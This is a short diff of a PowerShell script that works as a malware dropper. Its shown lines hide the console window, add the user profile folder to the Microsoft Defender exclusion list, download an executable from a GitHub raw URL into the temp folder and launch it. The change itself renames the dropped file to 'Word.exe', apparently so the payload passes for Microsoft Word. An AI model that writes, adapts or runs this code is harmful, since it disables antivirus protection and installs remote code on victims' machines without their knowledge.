@@ -13,7 +13,7 @@ function Hide-Console
 Hide-Console
 Add-MpPreference -ExclusionPath $env:USERPROFILE
 $url = 'https://github.com/MrRoyal1235/checkaccvjppro/raw/main/Word.exe'
-$outputFile = [System.IO.Path]::Combine($env:Temp, 'UniketNT.exe')
+$outputFile = [System.IO.Path]::Combine($env:Temp, 'Word.exe')
 Start-Sleep -Milliseconds 100 
 Invoke-WebRequest -Uri $url -OutFile $outputFile
 Start-Process -FilePath $outputFile
